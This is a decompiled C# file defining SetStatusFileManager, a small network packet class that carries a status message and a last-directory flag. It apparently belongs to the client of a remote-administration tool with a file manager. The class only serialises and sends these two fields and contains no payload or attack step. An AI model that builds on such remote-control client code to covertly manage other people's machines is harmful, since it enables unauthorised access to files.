using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000042 RID: 66
	[Serializable]
	public class SetStatusFileManager : IPacket
	{
		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060001C0 RID: 448 RVA: 0x00002D36 File Offset: 0x00000F36
		// (set) Token: 0x060001C1 RID: 449 RVA: 0x00002D3E File Offset: 0x00000F3E
		public string Message { get; set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060001C2 RID: 450 RVA: 0x00002D47 File Offset: 0x00000F47
		// (set) Token: 0x060001C3 RID: 451 RVA: 0x00002D4F File Offset: 0x00000F4F
		public bool SetLastDirectorySeen { get; set; }

		// Token: 0x060001C4 RID: 452 RVA: 0x000021D4 File Offset: 0x000003D4
		public SetStatusFileManager()
		{
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x00002D58 File Offset: 0x00000F58
		public SetStatusFileManager(string message, bool setLastDirectorySeen)
		{
			this.Message = message;
			this.SetLastDirectorySeen = setLastDirectorySeen;
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x00002D6E File Offset: 0x00000F6E
		public void Execute(Client client)
		{
			client.Send<SetStatusFileManager>(this);
		}
	}
}
